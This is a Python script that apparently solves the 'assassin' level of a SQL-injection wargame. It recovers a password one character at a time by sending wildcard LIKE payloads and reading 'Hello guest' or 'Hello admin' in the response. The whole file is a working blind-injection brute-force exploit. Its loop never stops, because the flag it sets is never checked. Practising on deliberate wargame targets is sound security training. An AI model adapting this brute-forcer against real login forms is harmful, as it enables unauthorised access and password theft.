import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookie = {'PHPSESSID': 'cookie'}

def find_pw():
    password = ""
    flag = 0
    while True:
        for value in range(38, 127):
            param = {"pw": "{}{}%".format(password, chr(value))}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "Hello guest" in req.text:
                password += chr(value)
                break
            elif "Hello admin" in req.text:
                password += chr(value)
                print("비밀번호: ", password)
                flag = 1
                break

find_pw()